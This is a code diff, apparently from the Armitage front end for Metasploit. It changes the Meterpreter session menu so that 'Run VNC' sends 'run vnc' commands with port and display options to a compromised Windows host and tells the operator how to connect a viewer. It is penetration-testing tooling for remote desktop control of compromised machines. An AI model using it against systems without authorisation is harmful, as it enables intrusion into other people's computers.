@@ -212,8 +212,27 @@ sub showMeterpreterMenu {
 
 			item($j, "Meterpreter Shell", 'M', lambda({ createMeterpreterTab($sid); }, $sid => "$sid"));
 
-			if ("*win*" iswm $platform && !$REMOTE) {
-				item($j, "Run VNC", 'V', lambda({ m_cmd($sid, "run vnc -t -i"); }, $sid => "$sid"));
+			if ("*win*" iswm $platform) {
+				item($j, "Run VNC", 'V', lambda({ 
+					local('$display');
+					$display = rand(9) . rand(9);
+       
+					%handlers["run"] = lambda({
+						if ($0 eq "begin") {
+							local('$a');
+							$a = iff($REMOTE, $MY_ADDRESS, "127.0.0.1");
+							showError("$2 $+ \nConnect VNC viewer to $a $+ :59 $+ $display (display $display $+ )\n\nIf your connection is refused, you may need to migrate to a \nnew process to set up VNC.");
+							%handlers["run"] = $null;
+						}
+					}, \$display);
+
+					if ($REMOTE) {
+						m_cmd($sid, "run vnc -V -t -O -v 59 $+ $display -p " . randomPort() . " -i");
+					}
+					else {
+						m_cmd($sid, "run vnc -V -t -v 59 $+ $display -p " . randomPort() . " -i");
+					}
+				}, $sid => "$sid"));
 			}
 
 	$j = menu($1, "Explore", 'E');
